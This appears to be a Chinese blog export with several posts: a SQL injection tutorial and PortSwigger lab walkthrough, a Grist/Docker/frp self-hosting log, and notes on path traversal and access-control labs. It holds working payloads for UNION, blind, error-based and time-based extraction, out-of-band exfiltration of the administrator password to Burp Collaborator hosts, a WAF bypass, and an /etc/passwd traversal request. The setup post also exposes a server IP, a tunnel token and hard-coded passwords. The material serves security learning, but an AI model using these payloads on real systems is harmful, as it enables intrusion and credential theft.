当你确定了原始查询返回的列数，并找到可存储字符串数据的列后，就可以着手获取关键数据了。\n假设存在以下条件：\n原始查询返回两列，且这两列均支持存储字符串数据； 注入点位于WHERE子句内的带引号字符串中； 数据库中存在一个名为users的表，包含username（用户名）和password（密码）两列。 在这个示例中，你可以提交如下输入，获取users表中的数据：\n1 \u0026#39; UNION SELECT username, password FROM users-- 要实施此类攻击，你需要预先知晓数据库中存在users表，且该表包含username和password列。若缺乏这些信息，就需要猜测表名和列名。不过，所有现代数据库都提供了查看数据库结构的方法，可通过这些方法确定其中包含的表和列。\n合并字符串 有时候，不会所有列都返回或显示，这时候就需要将字符串合并起来，具体需要看是什么数据库。\n例如在 Oracle 数据库中，可提交如下输入：\n1 \u0026#39; UNION SELECT username || \u0026#39;~\u0026#39; || password FROM users-- 这里使用的双竖线||是 Oracle 的字符串拼接运算符。注入的查询会将username和password字段的值拼接在一起，并以~字符作为分隔。\n不同数据库的差异 详见：SQL injection cheat sheet | Web Security Academy\n对注释、查询等，不同的数据库会有不同的特定行为，需要根据需要更改。主要类型有：Oracle、Microsoft、PostgreSQL、MySQL\n数据库信息查询 通过注入不同数据库厂商专属的查询语句，根据语句是否执行成功，来确定数据库的类型和版本。\n以下是用于查询几款主流数据库版本的语句：\n数据库类型 查询语句 微软 SQL Server、MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() 列出数据库中的内容 多数数据库类型（Oracle 除外）都包含一组名为 信息模式（information schema 的视图，这组视图会提供数据库的相关元数据信息。\nOracle 不使用information_schema，而是通过内置系统表（如all_tables查看表名、all_tab_columns查看列信息）来获取元数据。\n例如，你可以查询information_schema.tables来列出数据库中的所有表：\n1 SELECT * FROM information_schema.tables 该查询会返回类似如下的结果：\nTABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE 上述结果表明数据库中有三张表，分别为Products、Users和Feedback。\n随后，你可以查询information_schema.columns来列出单个表中的列信息：\n1 SELECT * FROM information_schema.columns WHERE table_name = \u0026#39;Users\u0026#39; 该查询会返回类似如下的结果：\nTABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE MyDatabase dbo Users UserId int MyDatabase dbo Users Username varchar MyDatabase dbo Users Password varchar 盲注 当应用程序存在 SQL 注入漏洞，但 HTTP 响应中不包含相关 SQL 查询的结果，也不显示任何数据库错误详情时，就会发生盲注。\n许多注入技术（如 UNION 攻击）在盲注漏洞中无法奏效，这是因为这些技术的核心依赖是能在应用响应中看到注入查询的执行结果。不过，攻击者仍可利用盲注获取未授权数据，只是需要使用不同的技术手段。\n布尔 什么技术手段呢？一个例子是，根据返回的内容进行判断，例如分别注入：\n1 2 …xyz\u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;1 …xyz\u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;2 观察返回的结果，如果两个例子返回的不同，就可以根据返回结果来判断查询是否是有效的，我们能做的就很多了。你可以通过发送一系列输入，逐字符测试密码，最终确定某项数据。\n操作步骤如下：\n首先发送以下输入：\n1 xyz\u0026#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = \u0026#39;Administrator\u0026#39;), 1, 1) \u0026gt; \u0026#39;m 若返回成功，说明注入的条件为真，即密码的第一个字符大于 m。\n接着发送以下输入：\n1 xyz\u0026#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = \u0026#39;Administrator\u0026#39;), 1, 1) \u0026gt; \u0026#39;t 若未返回成功，说明注入的条件为假，即密码的第一个字符不大于 t。\n最终发送以下输入，若返回成功，则可确认密码的第一个字符为 s：\n1 xyz\u0026#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = \u0026#39;Administrator\u0026#39;), 1, 1) = \u0026#39;s 重复上述过程，即可系统性地推断出 Administrator 用户的完整密码。\nSUBSTRING(查询的字符串，起始位置，截取几个字符)，在有些数据库里，又叫做 SUBSTR\n条件 报错型 SQL 注入指的是：即便在盲注场景下，你仍可利用数据库返回的错误信息，直接提取或推断数据库中的敏感数据。与布尔盲注的差别主要是,报错盲注会返回具体的报错信息可供利用，或者只检查语句本身是否合法，而不检查语句是否为真。\n要理解这种技术的工作方式，假设依次发送两个请求，请求中包含的TrackingId Cookie值分别为：\n1 2 xyz\u0026#39; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE \u0026#39;a\u0026#39; END)=\u0026#39;a xyz\u0026#39; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE \u0026#39;a\u0026#39; END)=\u0026#39;a 这些输入利用CASE关键字测试条件，并根据条件是否成立返回不同的表达式，具体逻辑如下：\n第一个输入中，CASE表达式的结果为'a'，不会触发任何数据库错误； 第二个输入中，CASE表达式的结果为1/0（零除运算），会触发除零错误。 如果该错误会导致应用的HTTP响应产生可识别的差异（如返回500错误页、弹出提示信息），你就可以借此判断注入的条件是否成立。\n借助这种技术，你可以通过逐字符测试的方式提取数据库中的数据，例如：\n1 xyz\u0026#39; AND (SELECT CASE WHEN (Username = \u0026#39;Administrator\u0026#39; AND SUBSTRING(Password, 1, 1) \u0026gt; \u0026#39;m\u0026#39;) THEN 1/0 ELSE \u0026#39;a\u0026#39; END FROM Users)=\u0026#39;a 典型错误：\n类型转换错误：例如在数值列中注入字符串，仅当条件为真时执行该转换（如AND (IF(1=1, CAST('a' AS INT), 0))）； 子查询语法错误：构造仅在条件为真时返回多行的子查询，触发 “单行子查询返回多行” 错误； 函数调用错误：调用数据库内置函数时传入非法参数，仅在条件为真时触发函数执行错误。 报错 由于数据库配置不当，有时会输出错误信息，在某些情况下，你甚至可以诱导应用生成包含查询结果数据的错误信息。这一手段能将原本的盲注漏洞，转化为可直接查看数据的 “显错注入”，大幅降低攻击难度。\n你可以使用CAST()函数实现这一目的，该函数的作用是将一种数据类型转换为另一种。例如，构造包含如下语句的查询：\n1 CAST((SELECT example_column FROM example_table) AS int) 通常，你试图读取的目标数据是字符串类型，而将字符串强制转换为不兼容的类型（如整数int）时，数据库会抛出类似如下的错误：\nERROR: invalid input syntax for type integer: \u0026ldquo;Example data\u0026rdquo;\n值得注意的是，若目标应用存在字符长度限制，导致你无法通过常规的条件响应方式进行盲注时，这种利用类型转换错误提取数据的方法会尤为有效。\n时间 若应用在SQL查询执行时捕获数据库错误并优雅处理，其响应不会出现任何差异——这意味着前文所述的条件错误注入技术将失效。\n这种情况下，可通过根据注入条件的真假触发不同时间延迟来利用盲注漏洞。由于应用通常会同步处理SQL查询，延迟SQL执行会导致HTTP响应同步延迟，因此可通过接收响应的耗时判断注入条件的真假。\n触发时间延迟的技术因数据库类型而异。例如在Microsoft SQL Server中，可通过以下语句测试条件并根据结果触发延迟：\n1 2 \u0026#39;; IF (1=2) WAITFOR DELAY \u0026#39;0:0:10\u0026#39;-- \u0026#39;; IF (1=1) WAITFOR DELAY \u0026#39;0:0:10\u0026#39;-- 第一条输入不触发延迟（条件1=2为假）； 第二条输入触发10秒延迟（条件1=1为真）。 借助该技术可逐字符提取数据，示例如下：\n1 \u0026#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = \u0026#39;Administrator\u0026#39; AND SUBSTRING(Password, 1, 1) \u0026gt; \u0026#39;m\u0026#39;) = 1 WAITFOR DELAY \u0026#39;0:0:{delay}\u0026#39;-- SQL查询中触发时间延迟的方式多样，不同数据库适用不同技术，详情可参考SQL注入速查表。\n带外 某些应用可能会以异步方式执行与之前示例相同的SQL查询：应用在原线程中继续处理用户请求，同时用另一个线程执行包含Tracking Cookie的SQL查询。此时查询仍存在SQL注入漏洞，但此前介绍的所有技术都将失效——因为应用的响应不依赖于查询返回的数据、数据库错误，也不依赖于查询的执行时间。\n这种情况下，通常可以通过触发向你控制的系统发起带外网络交互来利用盲注漏洞。你可以基于注入的条件触发这类交互，从而逐段推断信息；更实用的是，还能直接通过网络交互泄露数据。\n多种网络协议都可用于此目的，但最有效的通常是DNS（域名系统）——许多生产网络允许DNS查询自由出站，因为这是生产系统正常运行的必要条件。\n使用带外技术最简单可靠的工具是Burp Collaborator：这是一个提供多种网络服务（包括DNS）自定义实现的服务器，能让你检测发送单个载荷后是否触发了网络交互。Burp Suite专业版内置了客户端，默认已配置好与Burp Collaborator的协作。更多信息可参考Burp Collaborator的文档。\n触发DNS查询的技术因数据库类型而异。例如，在Microsoft SQL Server中，以下输入可导致数据库对指定域名发起DNS查询：\n1 \u0026#39;; exec master..xp_dirtree \u0026#39;//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a\u0026#39;-- exec master..xp_dirtree调用系统存储过程，传入的参数是一个网络共享 UNC 路径（//域名/a）\n这会让数据库查询以下域名：\n1 0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net 子域名外带：\n1 2 3 \u0026#39;; exec master..xp_dirtree \u0026#39;//\u0026#39; + (SELECT password FROM users WHERE username=\u0026#39;administrator\u0026#39;) + \u0026#39;.0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a\u0026#39;-- 或者多语句结合 \u0026#39;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=\u0026#39;Administrator\u0026#39;);exec(\u0026#39;master..xp_dirtree \u0026#34;//\u0026#39;+@p+\u0026#39;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a\u0026#34;\u0026#39;)-- 你可以用Burp Collaborator生成唯一的子域名，然后轮询Collaborator服务器，确认DNS查询是否发生。\n其他环境下的 SQL 注入 实际上，只要应用会将你可控制的输入作为SQL查询处理，任何这类输入都能用于实施SQL注入攻击。例如，部分网站会接收JSON或XML格式的输入，并利用这些输入查询数据库。\n这些不同的格式能为你提供多种混淆攻击的方法，以绕过原本会被WAF（Web应用防火墙）及其他防御机制拦截的攻击。许多防御机制的实现较为薄弱，仅通过在请求中搜索常见的SQL注入关键字（如SELECT、UNION）进行拦截，因此你可以通过对禁用关键字中的字符进行编码或转义，绕过这类过滤。例如，以下基于XML的SQL注入就使用了XML转义序列对SELECT中的S字符进行编码：\n1 2 3 4 \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt;123\u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt;999 \u0026amp;#x53;ELECT * FROM information_schema.tables\u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; 该转义字符会在服务器端被解码后，再传递给SQL解释器执行。\n二阶注入 一阶SQL注入指应用程序处理HTTP请求中的用户输入时，以不安全的方式将输入直接拼接到SQL查询中，导致漏洞触发。\n二阶SQL注入则是指应用程序先接收HTTP请求中的用户输入并存储（通常存入数据库），但数据存储阶段并不存在漏洞；后续处理另一个HTTP请求时，应用程序从存储中读取该数据，却以不安全的方式将其拼接到SQL查询中，最终触发注入。因此，二阶SQL注入也被称为存储型SQL注入（stored SQL injection）。\n二阶SQL注入的典型场景是：开发者已知一阶注入的风险，因此在数据首次存储时做了安全处理（如转义、参数化查询）；但后续读取该数据时，错误地认为“已存入数据库的数据是安全可信的”，未做任何安全校验就直接用于SQL查询，最终因这种“信任误用”导致漏洞。\n典型场景示例\n用户注册场景： 注册时输入用户名 admin'--，应用程序用参数化查询将其安全存入数据库（存储内容为 admin'--）；\n后台用户查询场景： 管理员在后台查询用户信息时，应用程序读取数据库中的用户名，以不安全方式拼接SQL：\n1 SELECT * FROM users WHERE username = \u0026#39;$stored_username\u0026#39;; 拼接后实际执行的SQL为：\n1 SELECT * FROM users WHERE username = \u0026#39;admin\u0026#39;--\u0026#39;; 注释符 -- 导致后续语句被忽略，实现越权查询。\n防范注入 核心方案：参数化查询（预处理语句） 用占位符?替代直接字符串拼接，将SQL查询结构与用户输入数据彻底分离，数据库会自动转义特殊字符，从根源杜绝注入。这是处理数据层面输入（WHERE条件、INSERT/UPDATE值）的最优解。\n局限性与替代方案 参数化查询无法用于SQL结构层面（表名、列名、ORDER BY子句）。此类场景需：\n白名单校验：仅允许预设的合法值； 逻辑重构：通过业务逻辑绕开用户输入直接参与SQL结构。 关键原则\n硬编码SQL常量：参数化查询的SQL语句必须是固定常量，不包含任何变量； 拒绝主观信任：无论数据来源（用户输入、数据库存储数据），均不直接拼接，避免二阶注入等风险； 禁用选择性拼接：不凭经验判断“数据是否安全”，彻底杜绝字符串拼接的使用。 Labs 题解 Union 攻击 常规 注入点：/filter?category=Corporate+gifts\n题目要求用 NULL 查询，所以闭合引号后，逐步添加 NULL 即可。payload '+UNION+SELECT+NULL,NULL,NULL--\n找可用列 注入点：/filter?category=Clothing%2c+shoes+and+accessories\n先出列数 '+ORDER+BY+3--\n题目说 Make the database retrieve the string: 'iIwJ8H' 所以用 'iIwJ8H' 逐个替换 NULL 查询即可。\n感觉有点奇怪的判断……\n拼接字符串 注入点：/filter?category=Gifts\n先判断列数：发现只有两列，而且只有一列是 string：'+UNION+SELECT+NULL,'abc'--,所以得考虑将 username 和 password 拼接起来\npayload：'+UNION+SELECT++NULL,username||'~'||password+FROM+users--\n数据库查询 普通查询 注入点：/filter?category=Gifts\n先判断列数：发现 'UNION+SELECT+NULL,NULL-- 不管多少都查询错误，考虑可能是数据库不一样，换成了 'UNION+SELECT+NULL,NULL#-- ，查询成功，然后查询指定列即可。\n查表、列名 注入点：/filter?category=Gifts\n先判断列数：'+ORDER+BY+2 两列\n1.查表名，这里出了问题。一开始的查询：'+UNION+SELECT+*,+NULL+FROM+information_schema.tables--，如果用通配符的话，会导致列数的不匹配！需要直接指定列名：'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--，发现特殊表 users_inatpk\n2.查列名，'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_inatpk',查询 information_schema.columns 表，需要指定对应的表名，否则结果很多，发现列名 password_xzxkya username_rxlzlc\n3.查数据，'+UNION+SELECT+username_rxlzlc,password_xzxkya+FROM+users_inatpk--\n盲注 布尔盲注 1.注入点：Cookie: TrackingId=ZVcenZbEGyKbb2Nc，用 ' and '1' ='1 来判断一下是否存在布尔盲注，发现查询成功的话会返回 Welcome 字段。\n2.检验：' AND (SELECT 'a' FROM users WHERE username='administrator')='a 来判断 users 表是否存在。这里的思路是 select 出一个恒等的字符串来验证，后面方便拼接进语句。\n3.查长度：' AND (SELECT 'a' FROM users WHERE username='administrator' and length(password)\u0026gt;1)='a 确定存在，然后 ' AND (SELECT 'a' FROM users WHERE username='administrator' and length(password)=20)='a 确定有 20 位\n4.查各个位数：手动查显然太麻烦了，这里用 Burp 的 Intruder 可以半自动查询。语句为 ' and (select substring(password,1,1) from users where username='administrator') = 'a,把最后的 a 设为爆破点，然后手动调整 (password,num,1) 进行爆破。\n5.记录：birxocztgrtwf7ugbhw3\n条件盲注 1.判断注入点：Cookie: TrackingId=y0chXfk5EGo4lz1o，' 报错，'' 不报错，从而确定是 SQL 语法报错注入。\n2.判断数据库类型：'||(SELECT '')||' 报错，'||(SELECT '' FROM dual)||' 不报错，从而判断是 Oracle\n3.验证目标表存在：'||(SELECT '' FROM not-a-real-table)||' 报错，'||(SELECT '' FROM users WHERE ROWNUM = 1)||' 不报错\n这里用 ROENUM 类似 limit，为的是方式返回多行结果\n总体思路就是通过字符串拼接来测试报错\n4.条件判断可行性：'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' 不报错，而改成 1=2 报错（除零），故可行。\n5.出长度：'||(SELECT CASE WHEN LENGTH(password)\u0026gt;1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'\n6.出密码：'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' 和前面一样，Intruder 枚举 a，手动改第一个 1 即可\n用 cluster bomb 更简单。sqlmap 不会用。\n技巧是全部扫完后，多选 - 高亮指定length - 排序。\n报错信息泄露 1.注入点：Cookie: TrackingId=B8kZGghEST0pmL5o，加一个'，发现报错：Unterminated string literal started at position，考虑信息泄露\n2.测试报错：' and cast((select 1) as int)--,报错ERROR: argument of AND must be type boolean, not type integer，验证。' AND 1=CAST((SELECT 1) AS int)--，不报错，是可以用的。' AND 1=CAST((SELECT username FROM users) AS int)-- 但是这样子又变成了最开始的报错，考虑是输入被截断了！！\n3.解决截断：' AND 1=CAST((SELECT username FROM users) AS int)--，报错变成ERROR: more than one row returned by a subquery used as an expression，再改成 ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--,报错ERROR: invalid input syntax for type integer: \u0026quot;administrator\u0026quot;，成功出用户名！\n4.出密码：' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--\n时间盲注 1.注入点判断：Cookie: TrackingId=x,添加'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--，对比'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- 发现延时，有时间盲注。这里的 %3B 是分号，防止 burp 识别成两个参数。\npg_sleep(n)的函数类型：pg_sleep是 PostgreSQL 的 “延迟函数”，返回值类型为void（无返回值），它的作用是暂停当前数据库会话的执行 ，仅能在SELECT语句的选择列表（SELECT 列/函数）中执行，无法作为WHERE子句的条件表达式。\n2.验证条件：'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\n3.出长度：'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)\u0026gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\n4.出密码：'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\nIntruder 里爆破，为了保证有效性，需要在 Resource Pool 里把线程数调整为 1，这样会串行发送请求（否则会同时发送n个，导致共同阻塞）。同时，看结果是需要开启顶栏 - columns - Response Received\nCluster Bomp用不了，只能手动调整数字，然后爆破字母，可以用多线程。\n带外盲注 1.注入点：Cookie: TrackingId=VKVwX08YULpCF0yM\n2.尝试带外：'+UNION+SELECT+EXTRACTVALUE(xmltype('\u0026lt;%3fxml+version%3d\u0026quot;1.0\u0026quot;+encoding%3d\u0026quot;UTF-8\u0026quot;%3f\u0026gt;\u0026lt;!DOCTYPE+root+[+\u0026lt;!ENTITY+%25+remote+SYSTEM+\u0026quot;http://255pds2evbd16n9qqk51tr8fu60xoncc.oastify.com\u0026quot;\u0026gt;+%25remote%3b]\u0026gt;'),'/l')+FROM+dual--\npayload讲解：\n该语句的关键是利用 Oracle 的 XML 外部实体注入（XXE）特性触发带外 HTTP 请求，流程如下\n闭合并拼接联合查询：通过单引号'闭合原始 SQL 的字符串，再用UNION SELECT拼接恶意查询，确保整体 SQL 语法合法。 构造 XML 类型数据：xmltype(...)将包含外部实体的 XML 字符串转换为 Oracle 可解析的 XML 对象。 解析外部实体触发带外请求： 当 Oracle 解析 XML 中的%remote;实体时，会根据SYSTEM指定的http://BURP-COLLABORATOR-SUBDOMAIN/发起HTTP 请求； 即使该 HTTP 请求无返回数据，Burp Collaborator 服务器也能捕获到这个请求，证明注入语句被执行。 补全语法并执行：EXTRACTVALUE和FROM dual补全 Oracle 的查询语法，让整个语句顺利执行，无语法错误。 在 Oracle 数据库的带外注入中，无法直接通过常规 SQL 语法发起 HTTP 请求，必须借助 XML 相关函数（如xmltype+EXTRACTVALUE）间接实现，核心原因是Oracle 本身没有内置的原生 HTTP 请求函数\nplus\npayload:\n1 \u0026#39;+UNION+SELECT+EXTRACTVALUE(xmltype(\u0026#39;\u0026lt;%3fxml+version%3d\u0026#34;1.0\u0026#34;+encoding%3d\u0026#34;UTF-8\u0026#34;%3f\u0026gt;\u0026lt;!DOCTYPE+root+[+\u0026lt;!ENTITY+%25+remote+SYSTEM+\u0026#34;http%3a//\u0026#39;||(SELECT+password+FROM+users+WHERE+username%3d\u0026#39;administrator\u0026#39;)||\u0026#39;.BURP-COLLABORATOR-SUBDOMAIN/\u0026#34;\u0026gt;+%25remote%3b]\u0026gt;\u0026#39;),\u0026#39;/l\u0026#39;)+FROM+dual-- 然后看子域名即可\n其他场景的注入 XML 编码绕过 WAF 1.注入点：\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt;2\u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; 2.测试：改为 1 union select null ，发现被检查出攻击了，有 waf。将内容进行 html 实体编码，发现绕过了。再测试，发现只能返回一行，所以需要拼接字符串。\n3.payload：\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt;2\u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt;1 UNION SELECT username || \u0026#39;~\u0026#39; || password FROM users\u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; 把1 UNION SELECT username || '~' || password FROM users 编码为\u0026amp;#49;\u0026amp;#32;\u0026amp;#85;\u0026amp;#78;\u0026amp;#73;\u0026amp;#79;\u0026amp;#78;\u0026amp;#32;\u0026amp;#83;\u0026amp;#69;\u0026amp;#76;\u0026amp;#69;\u0026amp;#67;\u0026amp;#84;\u0026amp;#32;\u0026amp;#117;\u0026amp;#115;\u0026amp;#101;\u0026amp;#114;\u0026amp;#110;\u0026amp;#97;\u0026amp;#109;\u0026amp;#101;\u0026amp;#32;\u0026amp;#124;\u0026amp;#124;\u0026amp;#32;\u0026amp;#39;\u0026amp;#126;\u0026amp;#39;\u0026amp;#32;\u0026amp;#124;\u0026amp;#124;\u0026amp;#32;\u0026amp;#112;\u0026amp;#97;\u0026amp;#115;\u0026amp;#115;\u0026amp;#119;\u0026amp;#111;\u0026amp;#114;\u0026amp;#100;\u0026amp;#32;\u0026amp;#70;\u0026amp;#82;\u0026amp;#79;\u0026amp;#77;\u0026amp;#32;\u0026amp;#117;\u0026amp;#115;\u0026amp;#101;\u0026amp;#114;\u0026amp;#115;\n","date":"2025-11-21T00:00:00Z","permalink":"https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/","title":"Burp靶场：SQL注入"},{"content":"准备工作 grist 的 github：Grist is the evolution of spreadsheets.\n先要创建一个虚拟机，选用了 lxc 而非 vm，其实是一个不太好的选择，导致在搭建过程中磕磕绊绊。应该是因为 PVE 对 lxc 进行了比较多的限制。\n正常创建就可以了，镜像选的是 ubuntu24.04。好像可以用模板？但是不知道密码，登不进去……\n配置 docker 环境 从头开始配还是有点麻烦，主要原因是镜像源太不稳定。先配置 apt 的源，把 docker 下下来，再配置 docker 的镜像，多找几个试试。还弄了 clash，但是没有用上（docker 的代理还要另外配置）。\n具体内容添加到了：配置docker\n配置 grist 官方 git 里面有 dockers-compose-examples：\n一开始用的是 grist-traefik（反向代理工具）-basic-auth 的，弄完了才知道出外网没有域名，反向代理很鸡肋……接着就改成了 grist-with-postgres-redis-minio，有了基础的存储，但是没有登录认证。\n配置文件如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 services: grist: image: gristlabs/grist:latest environment: TYPEORM_DATABASE: grist TYPEORM_USERNAME: grist TYPEORM_HOST: grist-db TYPEORM_LOGGING: false TYPEORM_PASSWORD: 12345678 TYPEORM_PORT: 5432 TYPEORM_TYPE: postgres REDIS_URL: redis://grist-redis GRIST_DOCS_MINIO_ACCESS_KEY: grist GRIST_DOCS_MINIO_SECRET_KEY: 12345678 GRIST_DOCS_MINIO_USE_SSL: 0 GRIST_DOCS_MINIO_BUCKET: grist-docs GRIST_DOCS_MINIO_ENDPOINT: grist-minio GRIST_DOCS_MINIO_PORT: 9000 volumes: - grist-persist:/persist # 命名卷 ports: - 8484:8484 depends_on: - grist-db - grist-redis - grist-minio - minio-setup grist-db: image: postgres:alpine environment: POSTGRES_DB: grist POSTGRES_USER: grist POSTGRES_PASSWORD: 12345678 volumes: - grist-postgres:/var/lib/postgresql/data # 命名卷 grist-redis: image: redis:alpine volumes: - grist-redis:/data # 命名卷 grist-minio: image: minio/minio:latest environment: MINIO_ROOT_USER: grist MINIO_ROOT_PASSWORD: 12345678 volumes: - grist-minio:/data # 命名卷 command: server /data --console-address=\u0026#34;:9001\u0026#34; minio-setup: image: minio/mc environment: MINIO_PASSWORD: 12345678 depends_on: grist-minio: condition: service_started restart: on-failure entrypoint: \u0026gt; /bin/sh -c \u0026#34; /usr/bin/mc alias set myminio http://grist-minio:9000 grist \u0026#39;12345678\u0026#39;; /usr/bin/mc mb myminio/grist-docs; /usr/bin/mc anonymous set public myminio/grist-docs; /usr/bin/mc version enable myminio/grist-docs; \u0026#34; # 定义命名卷（Docker自动创建，存储在/var/lib/docker/volumes） volumes: grist-persist: grist-postgres: grist-redis: grist-minio: 这里把路径、密码写死了，读取.env的话好像有点问题。\n要注意的 在 lxc 中，对权限会有限制，所以\ndocker 的版本有要求！参见：https://forum.proxmox.com/threads/docker-inside-lxc-net-ipv4-ip_unprivileged_port_start-error.175437/\n对挂载的数据卷有要求！\n不能挂载到 /root 下 后面改成了自定义命名卷，见上 穿透 用了 frp，还是弄了好一会\n1 2 3 4 5 6 7 8 9 10 11 12 13 # frpc.toml 客户端配置 [common] server_addr =8.137.38.223 server_port = 7000 # 服务端bind_port token = 11111 # Grist端口映射规则 [[proxies]] name = \u0026#34;grist-proxy\u0026#34; type = \u0026#34;tcp\u0026#34; local_ip = \u0026#34;127.0.0.1\u0026#34; local_port = 8484 remote_port = 9000 1 2 3 4 5 # frps.toml 服务端配置 [common] bind_addr = 0.0.0.0 # 指定监听 ipv4 bind_port = 7000 # TOML格式中，frp的配置项是下划线分隔（bind_port），不是驼峰（bindPort）！ token = 11111 分别运行nohup ./frps -c ./frps.toml \u0026gt; frps.log \u0026amp;即可。\n写下来才感觉没什么，做的时候思路就很乱。各种基础配置没有一个模板，就一直到处找，很低效。\n对 docker、反向代理的理解也是模棱两可，导致实际操作起来没有方向，不知道哪里出了问题、要怎么解决。\n然后具体的服务配置其实已经在 yml 里写得很清楚了，但是自己改的能力还是很差。以及，vim 要学起来用了……\n","date":"2025-11-20T00:00:00Z","permalink":"https://calendar0917.github.io/posts/devops-lxc%E4%B8%AD%E6%90%AD%E5%BB%BAgrist/","title":"PVE的lxc环境下搭建grist表格"},{"content":"Path traversal 路径穿越 路径遍历（又称目录遍历）漏洞允许攻击者读取运行应用程序的服务器上的任意文件，可能包括：\n应用程序代码与数据 后端系统的凭证信息 敏感的操作系统文件 在某些情况下，攻击者还可能向服务器的任意文件写入内容，进而修改应用程序数据或行为，最终完全控制服务器。\n示例\n\u0026lt;img src=\u0026quot;/loadImage?filename=218.png\u0026quot;\u0026gt;\n网站中有这样一个链接，如果在 Linux 系统中，一般 218.png 储存在 /var/www/images/218.png\n想要测试路径穿越，就用：https://insecure-website.com/loadImage?filename=../../../etc/passwd 来读取\n如果是 Windows，改用：https://insecure-website.com/loadImage?filename=..\\..\\..\\windows\\win.ini 即可\nLab\n比较简单，是一个商城页面，和上面类似。注意不能直接在浏览器访问，不然会被当成图片解析\nAcess Control 访问控制 在 Web 应用场景中，访问控制依赖于身份验证（Authentication）和会话管理（Session Management）：\n身份验证：确认用户是否为其声称的身份（即 “验明正身”）。 会话管理：识别后续哪些 HTTP 请求来自同一用户。 访问控制：判定该用户是否被允许执行其尝试的操作。 访问控制失效（Broken Access Controls）是常见且通常具有严重危害的安全漏洞。访问控制的设计与管理是一个复杂的动态问题 —— 需将业务、组织及合规约束融入技术实现中。由于访问控制的设计决策需人工制定，因此出错风险较高。\n垂直权限提升 若用户能够访问其无权限访问的功能，则构成垂直权限提升。例如，非管理员用户若能访问可删除用户账户的管理页面，即属于垂直权限提升。 未受保护的路径 最基础的纵向越权，源于应用对敏感功能完全未加保护。\n举例：某网站的敏感功能（如https://insecure-website.com/admin），可能被所有用户访问，而非仅限管理员。这类管理 URL 可能通过robots.txt等途径泄露，即便未公开，攻击者也可能用字典攻击猜解到位置。 可能通过 js 代码泄露 判定是否为管理员的参数在路径里 或者 cookie 等地方 Lab1 robots.txt 泄露\n先看下 /robots.txt，找到不可访问的路径，访问即可\nLab2 js 泄露\n看 js 代码，找到泄露的路径\nLab3 cookie 泄露\n进到 /login,发现不能注册。进到 /admin,发现不是管理员看不了。回到 /login 随便填，抓包看一下，发现 cookie 里泄露了 Admin = false\n不知道哪里出了问题，没有看到 cookie 里有 Admin\n水平越权 发生在某用户能违规读取其他用户的信息时\nLab userid 泄露\n在 user 的 blog 路径中可以看到 uid，然后在 myaccount 的地址中更换 uid 即可。\n垂直越权 用户可以通过更改已知路径，从而访问、修改 admin 的信息。\nLab 访问 admin\n其实是 administrator……\n登录已有账号后，抓包主页，改 id 为 administrator，就可以看到回显的密码，登录即可。\n身份验证漏洞 身份验证是确认用户身份真实性的过程。授权则涉及验证用户是否被允许执行特定操作。\n暴力破解 暴力破解并非总是单纯地对用户名和密码进行完全随机的猜测。攻击者还能结合基本逻辑或公开可得的知识，对暴力破解攻击进行精细调整，从而做出更具针对性的猜测。只有密码认证的网站容易被如此攻击。\n可以看 user 的主页，抓包的返回信息等内容；可以通过已知的用户名来枚举未知用户名；\nLab1 Intruder 